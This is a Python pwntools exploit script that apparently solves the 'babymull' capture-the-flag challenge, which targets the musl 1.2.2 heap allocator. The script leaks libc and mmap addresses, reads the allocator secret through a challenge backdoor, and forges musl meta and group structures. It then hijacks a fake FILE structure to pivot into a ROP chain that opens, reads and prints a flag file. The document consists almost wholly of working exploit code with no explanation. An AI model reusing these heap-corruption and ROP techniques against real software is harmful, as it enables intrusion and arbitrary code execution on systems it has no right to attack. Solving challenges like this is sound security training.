from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('babymull')
# libc = ELF('/mnt/hgfs/payoung/Documents/ctf/musl/musl-1.2.2/build/lib/libc.so')
libc = ELF('libc.so')
# libc = ELF('/lib/x86_64-linux-musl/libc.so') 
elf = ELF('babymull')


def add(name, size, content):
    io.sendlineafter('Your choice >> ', '1')
    io.sendafter('Name: ', name)
    io.sendlineafter('Size: ', str(size))
    io.sendafter('Content: ', content)


def delete(index):
    io.sendlineafter('Your choice >> ', '2')
    io.sendlineafter('Index: ', str(index))


def show(index):
    io.sendlineafter('Your choice >> ', '3')
    io.sendlineafter('Index: ', str(index))


def backdoor(write_addr, read_addr):
    io.sendlineafter('Your choice >> ', str(0x73317331))
    io.sendline(str(write_addr))
    io.sendline(str(read_addr))
    return int(io.recvline()[:-1], 16)


def pwn():
    add('a' * 0xf, 0x20, 'a' * 0x20)                            # 0
    add('b' * 0xf, 0x1000, b'\n')                               # 1
    for _ in range(7):
        add('c' * 0xf, 0x30, 'c' * 0x30)                        # 2
        delete(2)
    delete(0)
    add('c' * 0xf, 0x30, 'c' * 0x30)                            # 0
    delete(0)
    add('a' * 0xf, 0x1000, b'\x00' * 0x238 + p32(0x5) + b'\n')  # 0 for the check `reserved = *(const uint32_t *)(end-4); assert(reserved >= 5);``

    show(0)
    io.recvuntil('a' * 0x10)
    mmap_base = u64(io.recv(6).ljust(8, b'\x00')) - 0x1560
    libc_base = mmap_base + 0x4000
    __malloc_context = libc_base + libc.sym['__malloc_context']
    secret = backdoor(mmap_base + 0x155e, __malloc_context)
    log.success('mmap_base: ' + hex(mmap_base))
    log.success('libc_base: ' + hex(libc_base))
    log.success('secret: ' + hex(secret))
    longjmp = libc_base + libc.sym['longjmp']
    open = libc_base + libc.sym['open']
    read = libc_base + libc.sym['read']
    write = libc_base + libc.sym['write']
    __stdout_used = libc_base + 0x99450
    pop_rdi_ret = libc_base + 0x0000000000015536
    pop_rsi_ret = libc_base + 0x000000000001b3a9
    pop_rdx_ret = libc_base + 0x00000000000177c7
    ret = libc_base + 0x0000000000015238

    delete(1)
    fake_meta_addr = mmap_base + 0x1000 + 8
    fake_group_addr = mmap_base + 0x550
    prev, next, mem, avail_mask, freed_mask = mmap_base + 0x100, __stdout_used, fake_group_addr, 1, 0
    last_idx, freeable, sc, maplen = 1, 1, 24, 2
    fake_meta  = p64(prev) + p64(next) + p64(mem) + p32(avail_mask) + p32(freed_mask)      
    fake_meta += p64(last_idx | (freeable << 5) | (sc << 6) | (maplen << 12))
    payload  = b'\x00' * 0x520
    payload += p64(fake_meta_addr)                      # fake group
    payload += b'\x00' * 0xaa8
    payload += p64(secret)                              # fake meta_area
    payload += fake_meta                                # fake meta
    add('a' * 0xf, 0x1000, payload)                             # 1
    delete(0)
    delete(1)
    ropchain_addr = mmap_base + 0x700
    buf = mmap_base + 0x800
    fake_IO  = p64(0x45)                            # flags
    fake_IO += p64(0)                               # rpos
    fake_IO += p64(0)                               # rend
    fake_IO += p64(libc_base + 0x4b9f0)             # close
    fake_IO += p64(0)                               # wend
    fake_IO += p64(0)                               # wpos
    fake_IO += p64(ropchain_addr)                   # mustbezero_1  / rsp
    fake_IO += p64(ret)                             # wbase         / rip
    fake_IO += p64(0)                               # read
    fake_IO += p64(longjmp + 0x1e)                  # write
    ropchain  = p64(pop_rdi_ret) + p64(buf) + p64(pop_rsi_ret) + p64(0) + p64(pop_rdx_ret) + p64(0) + p64(open)
    ropchain += p64(pop_rdi_ret) + p64(3) + p64(pop_rsi_ret) + p64(buf) + p64(pop_rdx_ret) + p64(0x40) + p64(read)
    ropchain += p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_ret) + p64(buf) + p64(pop_rdx_ret) + p64(0x40) + p64(write)
    payload = b'\x00' * 0xc0 + fake_IO + b'\x00' * 0x5b0 + ropchain.ljust(0x100, b'\x00') + b'./flag'.ljust(0x100, b'\x00') + b'\n'
    add('a' * 0xf, 0x1000, payload)                             # 0
    # gdb.attach(io)
    io.sendlineafter('Your choice >> ', '4')
    # pause()
    flag = io.recv()
    log.success(flag.decode())


if __name__ == '__main__':
    pwn()

